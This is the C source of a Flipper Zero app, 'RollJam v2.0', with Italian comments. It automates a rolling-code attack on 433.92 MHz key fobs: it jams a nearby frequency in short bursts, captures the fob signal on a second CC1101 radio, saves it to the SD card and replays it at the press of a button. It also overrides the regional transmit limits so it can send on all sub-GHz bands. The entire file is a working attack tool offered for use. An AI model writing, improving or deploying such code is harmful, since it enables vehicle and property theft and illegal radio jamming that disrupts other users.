/*
 * RollJam One-Click FAP v2.0 — Flipper Zero + external CC1101 board
 * Uses subghz_devices API for external CC1101 (Uchuu007 / any ext board).
 * Based on RocketGod jammer architecture for device selection.
 */

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_region.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <input/input.h>
#include <notification/notification_messages.h>
#include <storage/storage.h>
#include <toolbox/stream/file_stream.h>
#include <toolbox/level_duration.h>
#include <subghz/devices/devices.h>
#include <subghz/devices/cc1101_configs.h>
#include <lib/subghz/subghz_tx_rx_worker.h>

#include "helpers/radio_device_loader.h"

#define TAG "RollJam"

#define ROLLJAM_LAST_SUB        EXT_PATH("subghz/rolljam/last.sub")
#define ROLLJAM_STORAGE_DIR     EXT_PATH("subghz/rolljam")
#define ROLLJAM_LOG_FILE        EXT_PATH("subghz/rolljam/debug.log")
#define ROLLJAM_FREQ_RX         433920000UL
#define ROLLJAM_FREQ_JAM        434100000UL

#define ROLLJAM_JAM_DURATION_MS 5
#define ROLLJAM_RX_WINDOW_MS    60
#define ROLLJAM_RX_EXTEND_MS    80
#define ROLLJAM_MAX_SESSION_MS  15000
#define ROLLJAM_RX_MIN_EDGES    80
#define ROLLJAM_MAX_TIMINGS     2048

#define FOB_TIMING_MIN_US       40
#define FOB_TIMING_MAX_US       2500
#define BEEP_FREQ_HZ            1000
#define BEEP_DURATION_MS        150

/* In-memory log buffer — flushed to SD after radio stops */
#define LOG_BUF_SIZE 2048
static char log_buf[LOG_BUF_SIZE];
static uint16_t log_pos = 0;

/* Storage handle globale per flush immediato (diagnostica crash) */
static Storage* g_log_storage = NULL;
static void log_add(const char* msg) {
    uint16_t len = strlen(msg);
    if(log_pos + len + 2 < LOG_BUF_SIZE) {
        memcpy(log_buf + log_pos, msg, len);
        log_pos += len;
        log_buf[log_pos++] = '\n';
        log_buf[log_pos] = '\0';
    }
    /* Flush IMMEDIATO — cattura tutto prima di eventuale crash */
    if(g_log_storage && log_pos > 0) {
        Stream* s = file_stream_alloc(g_log_storage);
        if(file_stream_open(s, ROLLJAM_LOG_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            stream_write_cstring(s, log_buf);
            file_stream_close(s);
        }
        stream_free(s);
    }
}

static void log_flush(Storage* storage) {
    if(log_pos == 0) return;
    Stream* s = file_stream_alloc(storage);
    if(file_stream_open(s, ROLLJAM_LOG_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        stream_write_cstring(s, log_buf);
        file_stream_close(s);
    }
    stream_free(s);
    log_pos = 0;
}

/* Region unlock for TX on all bands */
static FuriHalRegion unlockedRegion = {
    .country_code = "FTW",
    .bands_count = 3,
    .bands = {
        {.start = 299999755, .end = 348000000, .power_limit = 20, .duty_cycle = 50},
        {.start = 386999938, .end = 464000000, .power_limit = 20, .duty_cycle = 50},
        {.start = 778999847, .end = 928000000, .power_limit = 20, .duty_cycle = 50},
    },
};

typedef enum {
    StateReady,
    StateRunning,
    StateReplay,
    StateError,
} RollJamState;

typedef enum { EventTick, EventKey } EventType;
typedef struct { EventType type; InputEvent input; } RollJamEvent;

typedef struct {
    volatile uint32_t edge_count;
    volatile uint32_t duration_sum_us;
    uint32_t timings[ROLLJAM_MAX_TIMINGS];
    bool     levels[ROLLJAM_MAX_TIMINGS];
    volatile uint16_t timings_len;
} CaptureCtx;

typedef struct {
    FuriMessageQueue* event_queue;
    ViewPort* view_port;
    Gui* gui;
    NotificationApp* notifications;
    Storage* storage;
    RollJamState state;
    bool has_capture;
    uint8_t captured_count;
    char status_line[48];
    CaptureCtx capture;
    volatile uint16_t replay_index;
    volatile bool replay_done;
    volatile bool should_abort;
    uint16_t jam_count;
    /* subghz_devices API */
    const SubGhzDevice* device;
    SubGhzTxRxWorker* txrx_worker;
    bool device_is_external;
} RollJamApp;

static bool check_abort(RollJamApp* app) {
    if(app->should_abort) return true;
    RollJamEvent ev;
    while(furi_message_queue_get(app->event_queue, &ev, 0) == FuriStatusOk) {
        if(ev.type == EventKey && ev.input.key == InputKeyBack) {
            app->should_abort = true;
            return true;
        }
    }
    return false;
}

/* ---------- UI ---------- */

static void draw_cb(Canvas* canvas, void* ctx) {
    RollJamApp* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    switch(app->state) {
    case StateReady:
        canvas_draw_str_aligned(canvas, 64, 10, AlignCenter, AlignCenter, "ROLLJAM v2");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 24, AlignCenter, AlignCenter,
                                app->device_is_external ? "radio: ESTERNA" : "radio: interna");
        canvas_draw_str_aligned(canvas, 64, 36, AlignCenter, AlignCenter,
                                "OK = attacco (jam+rx)");
        if(app->has_capture) {
            canvas_draw_str_aligned(canvas, 64, 48, AlignCenter, AlignCenter,
                                    "v = replay");
        }
        if(app->captured_count > 0) {
            char buf[32];
            snprintf(buf, sizeof(buf), "catture: %u", app->captured_count);
            canvas_draw_str_aligned(canvas, 64, 60, AlignCenter, AlignCenter, buf);
        }
        break;

    case StateRunning:
        canvas_draw_str_aligned(canvas, 64, 12, AlignCenter, AlignCenter, "ATTACCO");
        canvas_set_font(canvas, FontSecondary);
        {
            char buf[48];
            snprintf(buf, sizeof(buf), "jam:%u edges:%lu len:%u",
                     app->jam_count,
                     (unsigned long)app->capture.edge_count,
                     (unsigned)app->capture.timings_len);
            canvas_draw_str_aligned(canvas, 64, 30, AlignCenter, AlignCenter, buf);
        }
        canvas_draw_str_aligned(canvas, 64, 50, AlignCenter, AlignCenter, "Back = abort");
        break;

    case StateReplay:
        canvas_draw_str_aligned(canvas, 64, 18, AlignCenter, AlignCenter, "TX...");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 34, AlignCenter, AlignCenter, app->status_line);
        break;

    case StateError:
        canvas_draw_str_aligned(canvas, 64, 18, AlignCenter, AlignCenter, "ERRORE");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(canvas, 64, 34, AlignCenter, AlignCenter, app->status_line);
        canvas_draw_str_aligned(canvas, 64, 46, AlignCenter, AlignCenter, "OK = riprova");
        break;
    }
}

static void input_cb(InputEvent* input, void* ctx) {
    RollJamApp* app = ctx;
    RollJamEvent ev = {.type = EventKey, .input = *input};
    furi_message_queue_put(app->event_queue, &ev, FuriWaitForever);
}

static void set_status(RollJamApp* app, const char* msg) {
    strncpy(app->status_line, msg, sizeof(app->status_line) - 1);
    app->status_line[sizeof(app->status_line) - 1] = '\0';
    view_port_update(app->view_port);
}

/* ---------- Radio: EXTERNAL = jam, INTERNAL = RX ---------- */

static const uint8_t preset_ook_650_regs[] = {
    0x02, 0x0D, 0x03, 0x47, 0x08, 0x32, 0x0B, 0x06,
    0x0F, 0x00, 0x10, 0x86, 0x11, 0x32, 0x12, 0x30,
    0x15, 0x14, 0x18, 0x18, 0x19, 0x18, 0x1B, 0x07,
    0x1C, 0x00, 0x1D, 0x91, 0x20, 0xFB, 0x21, 0x56,
    0x22, 0x11, 0x23, 0xE9, 0x24, 0x2A, 0x25, 0x00,
    0x26, 0x1F, 0x2C, 0x81, 0x2D, 0x35, 0x2E, 0x09,
    0x00, 0x00,
};
static const uint8_t preset_patable[8] = {
    0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

/* Custom preset rimosso: non funziona con API subghz_devices Momentum + E07 */

static bool radio_init_for_attack(RollJamApp* app) {
    log_add("radio_init_attack START");
    char _dbg_init[48];
    snprintf(_dbg_init, sizeof(_dbg_init), "device_ptr=%p worker=%p",
             (void*)app->device, (void*)app->txrx_worker);
    log_add(_dbg_init);

    /* Init external device if not done yet */
    if(!app->device) {
        app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeExternalCC1101);
        if(app->device) {
            app->device_is_external = true;
            log_add("EXT CC1101 found");
        } else {
            app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeInternal);
            app->device_is_external = false;
            log_add("EXT not found, using INTERNAL");
        }
    }
    if(!app->device) {
        log_add("radio_init FAILED: no device");
        return false;
    }

    /* External CC1101: prepare for jam */
    log_add("pre-reset");
    subghz_devices_reset(app->device);
    log_add("pre-idle");
    subghz_devices_idle(app->device);
    log_add("pre-preset");
    subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
    log_add("preset OK");

    /* Internal CC1101: prepare for RX */
    furi_hal_subghz_reset();
    furi_hal_subghz_idle();
    furi_hal_subghz_load_registers(preset_ook_650_regs);
    furi_hal_subghz_load_patable(preset_patable);
    furi_hal_subghz_set_frequency_and_path(ROLLJAM_FREQ_RX);

    char buf[64];
    snprintf(buf, sizeof(buf), "radio_init OK dev=%s ext=%d",
             app->device->name ? app->device->name : "?", app->device_is_external);
    log_add(buf);
    return true;
}

/* Forward declarations */
static void jam_on(RollJamApp* app);
static void jam_off(RollJamApp* app);

static void radio_deinit_attack(RollJamApp* app) {
    log_add("radio_deinit START");
    jam_off(app);
    log_add("jam_off OK");
    /* Full release: worker_stop lascia device inusabile.
     * radio_device_loader_end + device=NULL → prossimo init fa loader_set fresh. */
    if(app->device && !radio_device_loader_is_external(app->device)) {
        radio_device_loader_end(app->device);
    }
    app->device = NULL;
    log_add("device released");
    furi_hal_subghz_idle();
    log_add("radio_deinit done");
}

/* ---------- Capture callback ---------- */

static volatile bool last_level_valid = false;
static volatile bool last_level = false;

static void capture_callback(bool level, uint32_t duration, void* context) {
    CaptureCtx* c = context;
    if(duration < 30) return;
    c->edge_count++;
    c->duration_sum_us += duration;
    if(last_level_valid && last_level == level && c->timings_len > 0) {
        c->timings[c->timings_len - 1] += duration;
        return;
    }
    last_level_valid = true;
    last_level = level;
    if(c->timings_len < ROLLJAM_MAX_TIMINGS) {
        c->timings[c->timings_len] = duration;
        c->levels[c->timings_len] = level;
        c->timings_len++;
    }
}

static void capture_reset(CaptureCtx* c) {
    c->edge_count = 0;
    c->duration_sum_us = 0;
    c->timings_len = 0;
    last_level_valid = false;
}

/* ========== BOARD ESTERNA: jam on/off ========== */

/* Jam via INTERNAL CC1101 (~15mW max, basso impatto su RX external) */
static LevelDuration jam_internal_cb(void* ctx) {
    RollJamApp* app = ctx;
    if(app->should_abort) return level_duration_reset();
    return level_duration_make(true, 500);  /* 500us HIGH continuous */
}

static void jam_on(RollJamApp* app) {
    if(app->should_abort) return;
    if(app->jam_count == 0) log_add("jam_on: reset");
    furi_hal_subghz_reset();
    if(app->jam_count == 0) log_add("jam_on: idle");
    furi_hal_subghz_idle();
    if(app->jam_count == 0) log_add("jam_on: regs");
    furi_hal_subghz_load_registers(preset_ook_650_regs);
    if(app->jam_count == 0) log_add("jam_on: patable");
    furi_hal_subghz_load_patable(preset_patable);
    if(app->jam_count == 0) log_add("jam_on: freq");
    furi_hal_subghz_set_frequency_and_path(ROLLJAM_FREQ_JAM);
    if(app->jam_count == 0) log_add("jam_on: async_tx");
    if(furi_hal_subghz_start_async_tx(jam_internal_cb, app)) {
        app->jam_count++;
    } else if(app->jam_count == 0) {
        log_add("jam_on: async_tx FAIL");
    }
}

static void jam_off(RollJamApp* app) {
    (void)app;
    furi_hal_subghz_stop_async_tx();
    furi_hal_subghz_idle();
}

/* ========== CC1101 INTERNO: RX on/off ========== */

static void rx_internal_start(RollJamApp* app) {
    capture_reset(&app->capture);
    if(!app->device) return;
    /* RX su board ESTERNA (alta sensibilità LNA + antenna separata) */
    subghz_devices_idle(app->device);
    subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
    subghz_devices_set_frequency(app->device, ROLLJAM_FREQ_RX);
    subghz_devices_start_async_rx(app->device, capture_callback, &app->capture);
}

static void rx_internal_stop(RollJamApp* app) {
    if(!app->device) return;
    subghz_devices_stop_async_rx(app->device);
    subghz_devices_idle(app->device);
}

/* ---------- Beep ---------- */

static void beep_capture(void) {
    if(furi_hal_speaker_acquire(1000)) {
        furi_hal_speaker_start(BEEP_FREQ_HZ, 90);
        furi_delay_ms(BEEP_DURATION_MS);
        furi_hal_speaker_stop();
        furi_hal_speaker_release();
    }
}

/* ---------- Save / Load ---------- */

static bool save_capture(RollJamApp* app) {
    Stream* stream = file_stream_alloc(app->storage);
    if(!file_stream_open(stream, ROLLJAM_LAST_SUB, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        stream_free(stream);
        return false;
    }

    uint16_t n_raw = app->capture.timings_len;
    uint16_t kept = 0;
    bool skip_to_first_high = true;
    static int32_t filtered[ROLLJAM_MAX_TIMINGS];

    for(uint16_t i = 0; i < n_raw; i++) {
        uint32_t dur = app->capture.timings[i];
        bool lvl = app->capture.levels[i];
        if(dur < FOB_TIMING_MIN_US || dur > FOB_TIMING_MAX_US) continue;
        if(skip_to_first_high) {
            if(!lvl) continue;
            skip_to_first_high = false;
        }
        int32_t v = (int32_t)dur;
        if(!lvl) v = -v;
        if(kept > 0 && ((filtered[kept - 1] < 0) == (v < 0))) continue;
        filtered[kept++] = v;
    }

    stream_write_cstring(stream, "Filetype: Flipper SubGhz RAW File\n");
    stream_write_cstring(stream, "Version: 1\n");
    stream_write_cstring(stream, "Frequency: 433920000\n");
    stream_write_cstring(stream, "Preset: FuriHalSubGhzPresetOok650Async\n");
    stream_write_cstring(stream, "Protocol: RAW\n");
    stream_write_cstring(stream, "RAW_Data: ");

    char num_buf[16];
    for(uint16_t i = 0; i < kept; i++) {
        snprintf(num_buf, sizeof(num_buf), "%ld ", (long)filtered[i]);
        stream_write_cstring(stream, num_buf);
    }
    stream_write_cstring(stream, "\n");
    file_stream_close(stream);
    stream_free(stream);

    app->capture.timings_len = kept;
    for(uint16_t i = 0; i < kept; i++) {
        int32_t v = filtered[i];
        app->capture.levels[i] = v > 0;
        app->capture.timings[i] = (uint32_t)(v > 0 ? v : -v);
    }

    char buf[48];
    snprintf(buf, sizeof(buf), "SAVED %u edges (raw %u)", kept, n_raw);
    log_add(buf);
    return kept > 0;
}

static bool load_last_capture(RollJamApp* app) {
    Stream* stream = file_stream_alloc(app->storage);
    if(!file_stream_open(stream, ROLLJAM_LAST_SUB, FSAM_READ, FSOM_OPEN_EXISTING)) {
        stream_free(stream);
        return false;
    }

    app->capture.timings_len = 0;
    char line_buf[32];
    bool found_raw = false;
    while(!found_raw) {
        size_t pos = 0;
        while(pos < sizeof(line_buf) - 1) {
            uint8_t ch;
            if(stream_read(stream, &ch, 1) != 1) goto done;
            if(ch == '\n') break;
            line_buf[pos++] = (char)ch;
        }
        line_buf[pos] = '\0';
        if(strncmp(line_buf, "RAW_Data:", 9) == 0) found_raw = true;
    }
    if(!found_raw) goto done;

    char num[16];
    uint8_t ni = 0;
    bool reading = true;
    while(reading && app->capture.timings_len < ROLLJAM_MAX_TIMINGS) {
        uint8_t ch;
        if(stream_read(stream, &ch, 1) != 1) { reading = false; ch = ' '; }
        if(ch == ' ' || ch == '\n' || ch == '\r') {
            if(ni > 0) {
                num[ni] = '\0';
                long val = strtol(num, NULL, 10);
                if(val != 0) {
                    uint16_t idx = app->capture.timings_len;
                    app->capture.levels[idx] = val > 0;
                    app->capture.timings[idx] = (uint32_t)(val > 0 ? val : -val);
                    app->capture.timings_len++;
                }
                ni = 0;
            }
            if(ch == '\n') reading = false;
        } else {
            if(ni < sizeof(num) - 1) num[ni++] = (char)ch;
        }
    }

done:
    file_stream_close(stream);
    stream_free(stream);
    return app->capture.timings_len > 0;
}

/* ---------- Attack (jam + rx interleaved) ---------- */

static bool run_attack(RollJamApp* app) {
    log_add("=== ATTACK START ===");
    app->should_abort = false;
    app->jam_count = 0;

    uint32_t t0 = furi_get_tick();
    while(furi_get_tick() - t0 < ROLLJAM_MAX_SESSION_MS) {
        if(check_abort(app)) return false;

        /* 1) JAM ON — device auto-selezionato (external 1W o internal ~15mW) */
        jam_on(app);
        furi_delay_ms(ROLLJAM_JAM_DURATION_MS);
        jam_off(app);

        /* Gap lungo: PA E07 decay + worker stop + ADC settle per RX pulito */
        furi_delay_ms(50);

        if(check_abort(app)) return false;

        /* 2) RX — cc1101 interno ascolta */
        rx_internal_start(app);
        uint32_t rx_start = furi_get_tick();
        bool triggered = false;

        /* Log dettagliato ogni 50 cicli */
        if(app->jam_count % 50 == 1) {
            char dbg[80];
            snprintf(dbg, sizeof(dbg), "cyc=%u edges=%lu len=%u",
                     app->jam_count, (unsigned long)app->capture.edge_count,
                     (unsigned)app->capture.timings_len);
            log_add(dbg);
        }

        while(furi_get_tick() - rx_start < ROLLJAM_RX_WINDOW_MS) {
            if(check_abort(app)) break;
            furi_delay_ms(5);
            if(app->capture.edge_count >= ROLLJAM_RX_MIN_EDGES) {
                triggered = true;
                char buf[64];
                snprintf(buf, sizeof(buf), "TRIGGER edges=%lu",
                         (unsigned long)app->capture.edge_count);
                log_add(buf);
                uint32_t t_ext = furi_get_tick();
                while(furi_get_tick() - t_ext < ROLLJAM_RX_EXTEND_MS &&
                      app->capture.timings_len < ROLLJAM_MAX_TIMINGS - 16) {
                    if(check_abort(app)) break;
                    furi_delay_ms(10);
                }
                break;
            }
        }
        rx_internal_stop(app);
        view_port_update(app->view_port);

        if(triggered) {
            char buf[80];
            snprintf(buf, sizeof(buf), "OK jam=%u edges=%lu len=%u",
                     app->jam_count, (unsigned long)app->capture.edge_count,
                     app->capture.timings_len);
            log_add(buf);
            return true;
        }
    }

    char buf[80];
    snprintf(buf, sizeof(buf), "TIMEOUT jam=%u edges=%lu",
             app->jam_count, (unsigned long)app->capture.edge_count);
    log_add(buf);
    return false;
}

/* ---------- Replay using subghz_devices async TX ---------- */

static LevelDuration replay_tx_callback(void* context) {
    RollJamApp* app = context;
    if(app->replay_index >= app->capture.timings_len) {
        app->replay_done = true;
        return level_duration_reset();
    }
    bool lvl = app->capture.levels[app->replay_index];
    uint32_t dur = app->capture.timings[app->replay_index];
    app->replay_index++;
    if(dur == 0) dur = 1;
    return level_duration_make(lvl, dur);
}

static void do_replay(RollJamApp* app) {
    if(app->capture.timings_len == 0) {
        set_status(app, "buffer vuoto!");
        return;
    }
    char buf[48];
    snprintf(buf, sizeof(buf), "%u pulses", app->capture.timings_len);
    set_status(app, buf);

    app->replay_index = 0;
    app->replay_done = false;

    /* Replay: re-inizializza explicit preset+PATABLE prima async_tx per full 1W
     * (worker precedente può aver modificato stato) */
    subghz_devices_reset(app->device);
    subghz_devices_idle(app->device);
    subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
    subghz_devices_set_frequency(app->device, ROLLJAM_FREQ_RX);
    log_add("REPLAY preset+freq set");

    if(!subghz_devices_start_async_tx(app->device, replay_tx_callback, app)) {
        set_status(app, "TX denied");
        log_add("REPLAY TX denied");
        return;
    }

    uint32_t t_start = furi_get_tick();
    while(!subghz_devices_is_async_complete_tx(app->device) &&
          furi_get_tick() - t_start < 3000) {
        furi_delay_ms(10);
    }
    subghz_devices_stop_async_tx(app->device);
    subghz_devices_idle(app->device);

    snprintf(buf, sizeof(buf), "inviati %u/%u", app->replay_index, app->capture.timings_len);
    set_status(app, buf);
    log_add(buf);
}

/* ---------- State machine ---------- */

static void handle_key(RollJamApp* app, InputEvent* input) {
    if(input->type != InputTypeShort) return;

    switch(app->state) {
    case StateReady:
        if(input->key == InputKeyOk) {
            log_add("KEY OK -> ATTACK");
            if(!radio_init_for_attack(app)) {
                app->state = StateError;
                set_status(app, "radio init fail");
                log_flush(app->storage);
                return;
            }
            app->state = StateRunning;
            view_port_update(app->view_port);
            bool hit = run_attack(app);
            {
                char buf[80];
                snprintf(buf, sizeof(buf), "ATTACK DONE hit=%d jam=%u edges=%lu len=%u",
                         hit?1:0, app->jam_count,
                         (unsigned long)app->capture.edge_count, app->capture.timings_len);
                log_add(buf);
            }
            if(hit && save_capture(app)) {
                beep_capture();
                app->has_capture = true;
                app->captured_count++;
                log_add("CAPTURE SAVED + BEEP");
            } else if(!app->should_abort) {
                set_status(app, "nessun segnale");
                log_add("NO SIGNAL");
            }
            radio_deinit_attack(app);
            log_flush(app->storage);
            app->state = StateReady;
            view_port_update(app->view_port);
        } else if(input->key == InputKeyDown && app->has_capture) {
            log_add("KEY DOWN -> REPLAY");
            if(!radio_init_for_attack(app)) {
                app->state = StateError;
                set_status(app, "radio init fail");
                log_flush(app->storage);
                return;
            }
            app->state = StateReplay;
            view_port_update(app->view_port);
            do_replay(app);
            radio_deinit_attack(app);
            log_flush(app->storage);
            RollJamEvent drain;
            while(furi_message_queue_get(app->event_queue, &drain, 0) == FuriStatusOk) {}
            app->state = StateReady;
            view_port_update(app->view_port);
        }
        break;

    case StateError:
        if(input->key == InputKeyOk) {
            app->state = StateReady;
            view_port_update(app->view_port);
        }
        break;

    default:
        break;
    }
}

/* ---------- Lifecycle ---------- */

static RollJamApp* app_alloc(void) {
    RollJamApp* a = malloc(sizeof(RollJamApp));
    memset(a, 0, sizeof(RollJamApp));
    a->event_queue = furi_message_queue_alloc(8, sizeof(RollJamEvent));
    a->view_port = view_port_alloc();
    view_port_draw_callback_set(a->view_port, draw_cb, a);
    view_port_input_callback_set(a->view_port, input_cb, a);
    a->gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(a->gui, a->view_port, GuiLayerFullscreen);
    a->notifications = furi_record_open(RECORD_NOTIFICATION);
    a->storage = furi_record_open(RECORD_STORAGE);
    storage_simply_mkdir(a->storage, ROLLJAM_STORAGE_DIR);
    g_log_storage = a->storage;  /* abilita flush immediato log */

    /* Unlock region for TX */
    furi_hal_region_set(&unlockedRegion);

    /* Init subghz devices subsystem */
    subghz_devices_init();
    a->txrx_worker = subghz_tx_rx_worker_alloc();

    furi_hal_power_suppress_charge_enter();

    /* Device will be initialized on first OK press, not at startup */
    a->device = NULL;
    a->device_is_external = false;

    /* Auto-load last.sub if exists */
    if(load_last_capture(a)) {
        a->has_capture = true;
    }
    return a;
}

static void app_free(RollJamApp* a) {
    if(a->txrx_worker) {
        if(subghz_tx_rx_worker_is_running(a->txrx_worker)) {
            subghz_tx_rx_worker_stop(a->txrx_worker);
        }
        subghz_tx_rx_worker_free(a->txrx_worker);
    }
    /* Stop async TX se ancora attivo + worker → libera PA board */
    if(a->device) {
        subghz_devices_stop_async_tx(a->device);
        subghz_devices_idle(a->device);
    }
    /* Disabilita OTG SEMPRE → taglia 5V board, LED off */
    if(furi_hal_power_is_otg_enabled()) {
        furi_hal_power_disable_otg();
    }
    if(a->device && !radio_device_loader_is_external(a->device)) {
        radio_device_loader_end(a->device);
    }
    subghz_devices_deinit();
    furi_hal_power_suppress_charge_exit();

    gui_remove_view_port(a->gui, a->view_port);
    view_port_free(a->view_port);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_STORAGE);
    furi_message_queue_free(a->event_queue);
    free(a);
}

int32_t rolljam_app(void* p) {
    UNUSED(p);
    FURI_LOG_I(TAG, "=== RollJam v2.0 start ===");
    RollJamApp* app = app_alloc();
    app->state = StateReady;

    bool running = true;
    RollJamEvent ev;
    while(running) {
        if(furi_message_queue_get(app->event_queue, &ev, 200) != FuriStatusOk) {
            continue;
        }
        if(ev.type == EventKey) {
            if(ev.input.key == InputKeyBack && ev.input.type == InputTypeLong) {
                running = false;
            } else {
                handle_key(app, &ev.input);
            }
        }
    }
    app_free(app);
    FURI_LOG_I(TAG, "=== RollJam v2.0 stopped ===");
    return 0;
}
